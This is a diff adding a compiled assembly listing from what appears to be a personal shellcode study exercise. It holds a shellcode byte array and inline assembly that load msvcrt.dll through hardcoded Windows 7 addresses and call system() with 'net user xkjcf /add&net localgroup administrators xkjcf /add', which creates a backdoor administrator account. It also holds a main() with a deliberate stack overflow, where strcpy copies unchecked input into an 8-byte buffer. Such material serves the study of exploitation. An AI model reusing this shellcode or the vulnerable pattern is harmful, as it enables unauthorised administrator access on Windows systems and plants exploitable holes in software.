@@ -1,0 +1,568 @@
+	TITLE	K:\安全学习\小强之shellcode\C代码\AddUser\Add\Add.cpp
+	.386P
+include listing.inc
+if @Version gt 510
+.model FLAT
+else
+_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
+_TEXT	ENDS
+_DATA	SEGMENT DWORD USE32 PUBLIC 'DATA'
+_DATA	ENDS
+CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
+CONST	ENDS
+_BSS	SEGMENT DWORD USE32 PUBLIC 'BSS'
+_BSS	ENDS
+$$SYMBOLS	SEGMENT BYTE USE32 'DEBSYM'
+$$SYMBOLS	ENDS
+$$TYPES	SEGMENT BYTE USE32 'DEBTYP'
+$$TYPES	ENDS
+_TLS	SEGMENT DWORD USE32 PUBLIC 'TLS'
+_TLS	ENDS
+;	COMDAT ??_C@_0BA@ELDE@please?5input?4?4?6?$AA@
+CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
+CONST	ENDS
+;	COMDAT ??_C@_02DILL@?$CFs?$AA@
+CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
+CONST	ENDS
+;	COMDAT ??_C@_09LCDD@input?$DN?$CFs?6?$AA@
+CONST	SEGMENT DWORD USE32 PUBLIC 'CONST'
+CONST	ENDS
+;	COMDAT ??8@YAHABU_GUID@@0@Z
+_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
+_TEXT	ENDS
+;	COMDAT _main
+_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
+_TEXT	ENDS
+;	COMDAT ?_main@@YAHXZ
+_TEXT	SEGMENT PARA USE32 PUBLIC 'CODE'
+_TEXT	ENDS
+FLAT	GROUP _DATA, CONST, _BSS
+	ASSUME	CS: FLAT, DS: FLAT, SS: FLAT
+endif
+PUBLIC	?AddUser@@3PADA					; AddUser
+PUBLIC	?buffer@@3PADA					; buffer
+_BSS	SEGMENT
+?buffer@@3PADA DB 02800H DUP (?)			; buffer
+_BSS	ENDS
+_DATA	SEGMENT
+?AddUser@@3PADA DB 'U', 08bH, 0ecH, 'R', 083H, 0ecH, '@', 0c6H, 'E', 0c1H
+	DB	'm', 0c6H, 'E', 0c2H, 's', 0c6H, 'E', 0c3H, 'v', 0c6H, 'E', 0c4H
+	DB	'c', 0c6H, 'E', 0c5H, 'r', 0c6H, 'E', 0c6H, 't', 0c6H, 'E', 0c7H
+	DB	'.', 0c6H, 'E', 0c8H, 'd', 0c6H, 'E', 0c9H, 'l', 0c6H, 'E', 0caH
+	DB	'l', 0c6H, 'E', 0cbH, 00H, '3', 0d2H, 08dH, 'U', 0c1H, 'R', 0baH
+	DB	04H, '((u', 0ffH, 0d2H, 0c6H, 'E', 0c1H, 'n', 0c6H, 'E', 0c2H, 'e'
+	DB	0c6H, 'E', 0c3H, 't', 0c6H, 'E', 0c4H, ' ', 0c6H, 'E', 0c5H, 'u'
+	DB	0c6H, 'E', 0c6H, 's', 0c6H, 'E', 0c7H, 'e', 0c6H, 'E', 0c8H, 'r'
+	DB	0c6H, 'E', 0c9H, ' ', 0c6H, 'E', 0caH, 'x', 0c6H, 'E', 0cbH, 'k'
+	DB	0c6H, 'E', 0ccH, 'j', 0c6H, 'E', 0cdH, 'c', 0c6H, 'E', 0ceH, 'f'
+	DB	0c6H, 'E', 0cfH, ' ', 0c6H, 'E', 0d0H, '/', 0c6H, 'E', 0d1H, 'a'
+	DB	0c6H, 'E', 0d2H, 'd', 0c6H, 'E', 0d3H, 'd', 0c6H, 'E', 0d4H, '&'
+	DB	0c6H, 'E', 0d5H, 'n', 0c6H, 'E', 0d6H, 'e', 0c6H, 'E', 0d7H, 't'
+	DB	0c6H, 'E', 0d8H, ' ', 0c6H, 'E', 0d9H, 'l', 0c6H, 'E', 0daH, 'o'
+	DB	0c6H, 'E', 0dbH, 'c', 0c6H, 'E', 0dcH, 'a', 0c6H, 'E', 0ddH, 'l'
+	DB	0c6H, 'E', 0deH, 'g', 0c6H, 'E', 0dfH, 'r', 0c6H, 'E', 0e0H, 'o'
+	DB	0c6H, 'E', 0e1H, 'u', 0c6H, 'E', 0e2H, 'p', 0c6H, 'E', 0e3H, ' '
+	DB	0c6H, 'E', 0e4H, 'a', 0c6H, 'E', 0e5H, 'd', 0c6H, 'E', 0e6H, 'm'
+	DB	0c6H, 'E', 0e7H, 'i', 0c6H, 'E', 0e8H, 'n', 0c6H, 'E', 0e9H, 'i'
+	DB	0c6H, 'E', 0eaH, 's', 0c6H, 'E', 0ebH, 't', 0c6H, 'E', 0ecH, 'r'
+	DB	0c6H, 'E', 0edH, 'a', 0c6H, 'E', 0eeH, 't', 0c6H, 'E', 0efH, 'o'
+	DB	0c6H, 'E', 0f0H, 'r', 0c6H, 'E', 0f1H, 's', 0c6H, 'E', 0f2H, ' '
+	DB	0c6H, 'E', 0f3H, 'x', 0c6H, 'E', 0f4H, 'k', 0c6H, 'E', 0f5H, 'j'
+	DB	0c6H, 'E', 0f6H, 'c', 0c6H, 'E', 0f7H, 'f', 0c6H, 'E', 0f8H, ' '
+	DB	0c6H, 'E', 0f9H, '/', 0c6H, 'E', 0faH, 'a', 0c6H, 'E', 0fbH, 'd'
+	DB	0c6H, 'E', 0fcH, 'd', 0c6H, 'E', 0fdH, 00H, '3', 0d2H, 08dH, 'U'
+	DB	0c1H, 'R', 0baH, 'w', 0b1H, 0d4H, 'u', 0ffH, 0d2H, 'Z', 08bH, 0e5H
+	DB	']', 0c3H, 00H				; AddUser
+_DATA	ENDS
+PUBLIC	_main
+PUBLIC	??_C@_0BA@ELDE@please?5input?4?4?6?$AA@		; `string'
+PUBLIC	??_C@_02DILL@?$CFs?$AA@				; `string'
+PUBLIC	??_C@_09LCDD@input?$DN?$CFs?6?$AA@		; `string'
+EXTRN	__chkesp:NEAR
+EXTRN	_strcpy:NEAR
+EXTRN	_printf:NEAR
+EXTRN	_scanf:NEAR
+;	COMDAT ??_C@_0BA@ELDE@please?5input?4?4?6?$AA@
+; File K:\安全学习\小强之shellcode\C代码\AddUser\Add\Add.cpp
+CONST	SEGMENT
+??_C@_0BA@ELDE@please?5input?4?4?6?$AA@ DB 'please input..', 0aH, 00H ; `string'
+CONST	ENDS
+;	COMDAT ??_C@_02DILL@?$CFs?$AA@
+CONST	SEGMENT
+??_C@_02DILL@?$CFs?$AA@ DB '%s', 00H			; `string'
+CONST	ENDS
+;	COMDAT ??_C@_09LCDD@input?$DN?$CFs?6?$AA@
+CONST	SEGMENT
+??_C@_09LCDD@input?$DN?$CFs?6?$AA@ DB 'input=%s', 0aH, 00H ; `string'
+CONST	ENDS
+;	COMDAT _main
+_TEXT	SEGMENT
+_input$ = -8
+_main	PROC NEAR					; COMDAT
+
+; 32   : {
+
+  00000	55		 push	 ebp
+  00001	8b ec		 mov	 ebp, esp
+  00003	83 ec 48	 sub	 esp, 72			; 00000048H
+  00006	53		 push	 ebx
+  00007	56		 push	 esi
+  00008	57		 push	 edi
+  00009	8d 7d b8	 lea	 edi, DWORD PTR [ebp-72]
+  0000c	b9 12 00 00 00	 mov	 ecx, 18			; 00000012H
+  00011	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
+  00016	f3 ab		 rep stosd
+
+; 33   : /*	__asm{
+; 34   :         lea eax,AddUser
+; 35   :         push eax
+; 36   :         ret
+; 37   : 	}
+; 38   : */
+; 39   : char  input[8];
+; 40   : printf("please input..\n");
+
+  00018	68 00 00 00 00	 push	 OFFSET FLAT:??_C@_0BA@ELDE@please?5input?4?4?6?$AA@ ; `string'
+  0001d	e8 00 00 00 00	 call	 _printf
+  00022	83 c4 04	 add	 esp, 4
+
+; 41   : scanf("%s",buffer);
+
+  00025	68 00 00 00 00	 push	 OFFSET FLAT:?buffer@@3PADA ; buffer
+  0002a	68 00 00 00 00	 push	 OFFSET FLAT:??_C@_02DILL@?$CFs?$AA@ ; `string'
+  0002f	e8 00 00 00 00	 call	 _scanf
+  00034	83 c4 08	 add	 esp, 8
+
+; 42   : strcpy(input,buffer);
+
+  00037	68 00 00 00 00	 push	 OFFSET FLAT:?buffer@@3PADA ; buffer
+  0003c	8d 45 f8	 lea	 eax, DWORD PTR _input$[ebp]
+  0003f	50		 push	 eax
+  00040	e8 00 00 00 00	 call	 _strcpy
+  00045	83 c4 08	 add	 esp, 8
+
+; 43   : printf("input=%s\n",input);
+
+  00048	8d 4d f8	 lea	 ecx, DWORD PTR _input$[ebp]
+  0004b	51		 push	 ecx
+  0004c	68 00 00 00 00	 push	 OFFSET FLAT:??_C@_09LCDD@input?$DN?$CFs?6?$AA@ ; `string'
+  00051	e8 00 00 00 00	 call	 _printf
+  00056	83 c4 08	 add	 esp, 8
+
+; 44   : return 0;
+
+  00059	33 c0		 xor	 eax, eax
+
+; 45   : }
+
+  0005b	5f		 pop	 edi
+  0005c	5e		 pop	 esi
+  0005d	5b		 pop	 ebx
+  0005e	83 c4 48	 add	 esp, 72			; 00000048H
+  00061	3b ec		 cmp	 ebp, esp
+  00063	e8 00 00 00 00	 call	 __chkesp
+  00068	8b e5		 mov	 esp, ebp
+  0006a	5d		 pop	 ebp
+  0006b	c3		 ret	 0
+_main	ENDP
+_TEXT	ENDS
+PUBLIC	?_main@@YAHXZ					; _main
+;	COMDAT ?_main@@YAHXZ
+_TEXT	SEGMENT
+?_main@@YAHXZ PROC NEAR					; _main, COMDAT
+
+; 57   : {
+
+  00000	55		 push	 ebp
+  00001	8b ec		 mov	 ebp, esp
+  00003	83 ec 40	 sub	 esp, 64			; 00000040H
+  00006	53		 push	 ebx
+  00007	56		 push	 esi
+  00008	57		 push	 edi
+  00009	8d 7d c0	 lea	 edi, DWORD PTR [ebp-64]
+  0000c	b9 10 00 00 00	 mov	 ecx, 16			; 00000010H
+  00011	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
+  00016	f3 ab		 rep stosd
+
+; 58   : 
+; 59   : 	 //LoadLibrary在win7下的地址为0x761a2804
+; 60   : 	 __asm{
+; 61   : 		  //保存现场
+; 62   : 		  push ebp
+
+  00018	55		 push	 ebp
+
+; 63   : 		  mov  ebp, esp
+
+  00019	8b ec		 mov	 ebp, esp
+
+; 64   : 		  push edx
+
+  0001b	52		 push	 edx
+
+; 65   : 		  sub  esp, 40h
+
+  0001c	83 ec 40	 sub	 esp, 64			; 00000040H
+
+; 66   : 		  /*
+; 67   : 		  *msvcrt.dll
+; 68   : 		  */
+; 69   : 		  mov  byte ptr [ebp-3fh],6dh //m
+
+  0001f	c6 45 c1 6d	 mov	 BYTE PTR [ebp-63], 109	; 0000006dH
+
+; 70   : 		  mov  byte ptr [ebp-3eh],73h //s
+
+  00023	c6 45 c2 73	 mov	 BYTE PTR [ebp-62], 115	; 00000073H
+
+; 71   : 		  mov  byte ptr [ebp-3dh],76h //v
+
+  00027	c6 45 c3 76	 mov	 BYTE PTR [ebp-61], 118	; 00000076H
+
+; 72   : 		  mov  byte ptr [ebp-3ch],63h //c
+
+  0002b	c6 45 c4 63	 mov	 BYTE PTR [ebp-60], 99	; 00000063H
+
+; 73   : 		  mov  byte ptr [ebp-3bh],72h //r
+
+  0002f	c6 45 c5 72	 mov	 BYTE PTR [ebp-59], 114	; 00000072H
+
+; 74   : 		  mov  byte ptr [ebp-3ah],74h //t
+
+  00033	c6 45 c6 74	 mov	 BYTE PTR [ebp-58], 116	; 00000074H
+
+; 75   : 		  mov  byte ptr [ebp-39h],2eh //.
+
+  00037	c6 45 c7 2e	 mov	 BYTE PTR [ebp-57], 46	; 0000002eH
+
+; 76   : 		  mov  byte ptr [ebp-38h],64h //d
+
+  0003b	c6 45 c8 64	 mov	 BYTE PTR [ebp-56], 100	; 00000064H
+
+; 77   : 		  mov  byte ptr [ebp-37h],6ch //l
+
+  0003f	c6 45 c9 6c	 mov	 BYTE PTR [ebp-55], 108	; 0000006cH
+
+; 78   : 		  mov  byte ptr [ebp-36h],6ch //l
+
+  00043	c6 45 ca 6c	 mov	 BYTE PTR [ebp-54], 108	; 0000006cH
+
+; 79   : 		  mov  byte ptr [ebp-35h],0h //0
+
+  00047	c6 45 cb 00	 mov	 BYTE PTR [ebp-53], 0
+
+; 80   : 		  //调用LoadLibrary加载msvcrt.dll
+; 81   : 		  lea  edx, [ebp-3fh]
+
+  0004b	8d 55 c1	 lea	 edx, DWORD PTR [ebp-63]
+
+; 82   : 		  push edx
+
+  0004e	52		 push	 edx
+
+; 83   : 		  mov  edx, 761a2804h
+
+  0004f	ba 04 28 1a 76	 mov	 edx, 1981425668		; 761a2804H
+
+; 84   : 		  call edx
+
+  00054	ff d2		 call	 edx
+
+; 85   : 		  /*
+; 86   : 		  * net user xkjcf /add&net localgroup administrators xkjcf /add 共60字节
+; 87   : 		  */
+; 88   : 		  mov  byte ptr [ebp-3fh],6eh //n
+
+  00056	c6 45 c1 6e	 mov	 BYTE PTR [ebp-63], 110	; 0000006eH
+
+; 89   : 		  mov  byte ptr [ebp-3eh],65h //e
+
+  0005a	c6 45 c2 65	 mov	 BYTE PTR [ebp-62], 101	; 00000065H
+
+; 90   : 		  mov  byte ptr [ebp-3dh],74h //t
+
+  0005e	c6 45 c3 74	 mov	 BYTE PTR [ebp-61], 116	; 00000074H
+
+; 91   : 		  mov  byte ptr [ebp-3ch],20h //
+
+  00062	c6 45 c4 20	 mov	 BYTE PTR [ebp-60], 32	; 00000020H
+
+; 92   : 		  mov  byte ptr [ebp-3bh],75h //u
+
+  00066	c6 45 c5 75	 mov	 BYTE PTR [ebp-59], 117	; 00000075H
+
+; 93   : 		  mov  byte ptr [ebp-3ah],73h //s
+
+  0006a	c6 45 c6 73	 mov	 BYTE PTR [ebp-58], 115	; 00000073H
+
+; 94   : 		  mov  byte ptr [ebp-39h],65h //e
+
+  0006e	c6 45 c7 65	 mov	 BYTE PTR [ebp-57], 101	; 00000065H
+
+; 95   : 		  mov  byte ptr [ebp-38h],72h //r
+
+  00072	c6 45 c8 72	 mov	 BYTE PTR [ebp-56], 114	; 00000072H
+
+; 96   : 		  mov  byte ptr [ebp-37h],20h //
+
+  00076	c6 45 c9 20	 mov	 BYTE PTR [ebp-55], 32	; 00000020H
+
+; 97   : 		  mov  byte ptr [ebp-36h],78h //x
+
+  0007a	c6 45 ca 78	 mov	 BYTE PTR [ebp-54], 120	; 00000078H
+
+; 98   : 		  mov  byte ptr [ebp-35h],6bh //k
+
+  0007e	c6 45 cb 6b	 mov	 BYTE PTR [ebp-53], 107	; 0000006bH
+
+; 99   : 		  mov  byte ptr [ebp-34h],6ah //j
+
+  00082	c6 45 cc 6a	 mov	 BYTE PTR [ebp-52], 106	; 0000006aH
+
+; 100  : 		  mov  byte ptr [ebp-33h],63h //c
+
+  00086	c6 45 cd 63	 mov	 BYTE PTR [ebp-51], 99	; 00000063H
+
+; 101  : 		  mov  byte ptr [ebp-32h],66h //f
+
+  0008a	c6 45 ce 66	 mov	 BYTE PTR [ebp-50], 102	; 00000066H
+
+; 102  : 		  mov  byte ptr [ebp-31h],20h // 
+
+  0008e	c6 45 cf 20	 mov	 BYTE PTR [ebp-49], 32	; 00000020H
+
+; 103  : 		  mov  byte ptr [ebp-30h],2fh ///
+
+  00092	c6 45 d0 2f	 mov	 BYTE PTR [ebp-48], 47	; 0000002fH
+
+; 104  : 		  mov  byte ptr [ebp-2fh],61h //a
+
+  00096	c6 45 d1 61	 mov	 BYTE PTR [ebp-47], 97	; 00000061H
+
+; 105  : 		  mov  byte ptr [ebp-2eh],64h //d
+
+  0009a	c6 45 d2 64	 mov	 BYTE PTR [ebp-46], 100	; 00000064H
+
+; 106  : 		  mov  byte ptr [ebp-2dh],64h //d
+
+  0009e	c6 45 d3 64	 mov	 BYTE PTR [ebp-45], 100	; 00000064H
+
+; 107  : 		  mov  byte ptr [ebp-2ch],26h //&
+
+  000a2	c6 45 d4 26	 mov	 BYTE PTR [ebp-44], 38	; 00000026H
+
+; 108  : 		  mov  byte ptr [ebp-2bh],6eh //n
+
+  000a6	c6 45 d5 6e	 mov	 BYTE PTR [ebp-43], 110	; 0000006eH
+
+; 109  : 		  mov  byte ptr [ebp-2ah],65h //e
+
+  000aa	c6 45 d6 65	 mov	 BYTE PTR [ebp-42], 101	; 00000065H
+
+; 110  : 		  mov  byte ptr [ebp-29h],74h //t
+
+  000ae	c6 45 d7 74	 mov	 BYTE PTR [ebp-41], 116	; 00000074H
+
+; 111  : 		  mov  byte ptr [ebp-28h],20h // 
+
+  000b2	c6 45 d8 20	 mov	 BYTE PTR [ebp-40], 32	; 00000020H
+
+; 112  : 		  mov  byte ptr [ebp-27h],6ch //l
+
+  000b6	c6 45 d9 6c	 mov	 BYTE PTR [ebp-39], 108	; 0000006cH
+
+; 113  : 		  mov  byte ptr [ebp-26h],6fh //o
+
+  000ba	c6 45 da 6f	 mov	 BYTE PTR [ebp-38], 111	; 0000006fH
+
+; 114  : 		  mov  byte ptr [ebp-25h],63h //c
+
+  000be	c6 45 db 63	 mov	 BYTE PTR [ebp-37], 99	; 00000063H
+
+; 115  : 		  mov  byte ptr [ebp-24h],61h //a
+
+  000c2	c6 45 dc 61	 mov	 BYTE PTR [ebp-36], 97	; 00000061H
+
+; 116  : 		  mov  byte ptr [ebp-23h],6ch //l
+
+  000c6	c6 45 dd 6c	 mov	 BYTE PTR [ebp-35], 108	; 0000006cH
+
+; 117  : 		  mov  byte ptr [ebp-22h],67h //g
+
+  000ca	c6 45 de 67	 mov	 BYTE PTR [ebp-34], 103	; 00000067H
+
+; 118  : 		  mov  byte ptr [ebp-21h],72h //r
+
+  000ce	c6 45 df 72	 mov	 BYTE PTR [ebp-33], 114	; 00000072H
+
+; 119  : 		  mov  byte ptr [ebp-20h],6fh //o
+
+  000d2	c6 45 e0 6f	 mov	 BYTE PTR [ebp-32], 111	; 0000006fH
+
+; 120  : 		  mov  byte ptr [ebp-1fh],75h //u
+
+  000d6	c6 45 e1 75	 mov	 BYTE PTR [ebp-31], 117	; 00000075H
+
+; 121  : 		  mov  byte ptr [ebp-1eh],70h //p
+
+  000da	c6 45 e2 70	 mov	 BYTE PTR [ebp-30], 112	; 00000070H
+
+; 122  : 		  mov  byte ptr [ebp-1dh],20h // 
+
+  000de	c6 45 e3 20	 mov	 BYTE PTR [ebp-29], 32	; 00000020H
+
+; 123  : 		  mov  byte ptr [ebp-1ch],61h //a
+
+  000e2	c6 45 e4 61	 mov	 BYTE PTR [ebp-28], 97	; 00000061H
+
+; 124  : 		  mov  byte ptr [ebp-1bh],64h //d 
+
+  000e6	c6 45 e5 64	 mov	 BYTE PTR [ebp-27], 100	; 00000064H
+
+; 125  : 		  mov  byte ptr [ebp-1ah],6dh //m 
+
+  000ea	c6 45 e6 6d	 mov	 BYTE PTR [ebp-26], 109	; 0000006dH
+
+; 126  : 		  mov  byte ptr [ebp-19h],69h //i 
+
+  000ee	c6 45 e7 69	 mov	 BYTE PTR [ebp-25], 105	; 00000069H
+
+; 127  : 		  mov  byte ptr [ebp-18h],6eh //n 
+
+  000f2	c6 45 e8 6e	 mov	 BYTE PTR [ebp-24], 110	; 0000006eH
+
+; 128  : 		  mov  byte ptr [ebp-17h],69h //i 
+
+  000f6	c6 45 e9 69	 mov	 BYTE PTR [ebp-23], 105	; 00000069H
+
+; 129  : 		  mov  byte ptr [ebp-16h],73h //s 
+
+  000fa	c6 45 ea 73	 mov	 BYTE PTR [ebp-22], 115	; 00000073H
+
+; 130  : 		  mov  byte ptr [ebp-15h],74h //t 
+
+  000fe	c6 45 eb 74	 mov	 BYTE PTR [ebp-21], 116	; 00000074H
+
+; 131  : 		  mov  byte ptr [ebp-14h],72h //r 
+
+  00102	c6 45 ec 72	 mov	 BYTE PTR [ebp-20], 114	; 00000072H
+
+; 132  : 		  mov  byte ptr [ebp-13h],61h //a 
+
+  00106	c6 45 ed 61	 mov	 BYTE PTR [ebp-19], 97	; 00000061H
+
+; 133  : 		  mov  byte ptr [ebp-12h],74h //t 
+
+  0010a	c6 45 ee 74	 mov	 BYTE PTR [ebp-18], 116	; 00000074H
+
+; 134  : 		  mov  byte ptr [ebp-11h],6fh //o 
+
+  0010e	c6 45 ef 6f	 mov	 BYTE PTR [ebp-17], 111	; 0000006fH
+
+; 135  : 		  mov  byte ptr [ebp-10h],72h //r 
+
+  00112	c6 45 f0 72	 mov	 BYTE PTR [ebp-16], 114	; 00000072H
+
+; 136  : 		  mov  byte ptr [ebp-0fh],73h //s 
+
+  00116	c6 45 f1 73	 mov	 BYTE PTR [ebp-15], 115	; 00000073H
+
+; 137  : 		  mov  byte ptr [ebp-0eh],20h //  
+
+  0011a	c6 45 f2 20	 mov	 BYTE PTR [ebp-14], 32	; 00000020H
+
+; 138  : 		  mov  byte ptr [ebp-0dh],78h //x 
+
+  0011e	c6 45 f3 78	 mov	 BYTE PTR [ebp-13], 120	; 00000078H
+
+; 139  : 		  mov  byte ptr [ebp-0ch],6bh //k 
+
+  00122	c6 45 f4 6b	 mov	 BYTE PTR [ebp-12], 107	; 0000006bH
+
+; 140  : 		  mov  byte ptr [ebp-0bh],6ah //j 
+
+  00126	c6 45 f5 6a	 mov	 BYTE PTR [ebp-11], 106	; 0000006aH
+
+; 141  : 		  mov  byte ptr [ebp-0ah],63h //c 
+
+  0012a	c6 45 f6 63	 mov	 BYTE PTR [ebp-10], 99	; 00000063H
+
+; 142  : 		  mov  byte ptr [ebp-09h],66h //f 
+
+  0012e	c6 45 f7 66	 mov	 BYTE PTR [ebp-9], 102	; 00000066H
+
+; 143  : 		  mov  byte ptr [ebp-08h],20h //  
+
+  00132	c6 45 f8 20	 mov	 BYTE PTR [ebp-8], 32	; 00000020H
+
+; 144  : 		  mov  byte ptr [ebp-07h],2fh /// 
+
+  00136	c6 45 f9 2f	 mov	 BYTE PTR [ebp-7], 47	; 0000002fH
+
+; 145  : 		  mov  byte ptr [ebp-06h],61h //a 
+
+  0013a	c6 45 fa 61	 mov	 BYTE PTR [ebp-6], 97	; 00000061H
+
+; 146  : 		  mov  byte ptr [ebp-05h],64h //d 
+
+  0013e	c6 45 fb 64	 mov	 BYTE PTR [ebp-5], 100	; 00000064H
+
+; 147  : 		  mov  byte ptr [ebp-04h],64h //d 
+
+  00142	c6 45 fc 64	 mov	 BYTE PTR [ebp-4], 100	; 00000064H
+
+; 148  : 		  mov  byte ptr [ebp-03h],0h //0 
+
+  00146	c6 45 fd 00	 mov	 BYTE PTR [ebp-3], 0
+
+; 149  : 		  //调用system添加管理员用户xkjcf
+; 150  : 		  lea  edx, [ebp-3fh]
+
+  0014a	8d 55 c1	 lea	 edx, DWORD PTR [ebp-63]
+
+; 151  : 		  push edx
+
+  0014d	52		 push	 edx
+
+; 152  : 		  mov  edx, 776bb177h   //win7下的system地址
+
+  0014e	ba 77 b1 6b 77	 mov	 edx, 2003546487		; 776bb177H
+
+; 153  : 		  call edx
+
+  00153	ff d2		 call	 edx
+
+; 154  : 		  //还回现场
+; 155  : 		  pop  edx
+
+  00155	5a		 pop	 edx
+
+; 156  : 		  mov  esp, ebp
+
+  00156	8b e5		 mov	 esp, ebp
+
+; 157  : 		  pop  ebp
+
+  00158	5d		 pop	 ebp
+
+; 158  : 		  //ret
+; 159  : 	 }
+; 160  : 
+; 161  : 	return 0;
+
+  00159	33 c0		 xor	 eax, eax
+
+; 162  : }
+
+  0015b	5f		 pop	 edi
+  0015c	5e		 pop	 esi
+  0015d	5b		 pop	 ebx
+  0015e	83 c4 40	 add	 esp, 64			; 00000040H
+  00161	3b ec		 cmp	 ebp, esp
+  00163	e8 00 00 00 00	 call	 __chkesp
+  00168	8b e5		 mov	 esp, ebp
+  0016a	5d		 pop	 ebp
+  0016b	c3		 ret	 0
+?_main@@YAHXZ ENDP					; _main
+_TEXT	ENDS
+END
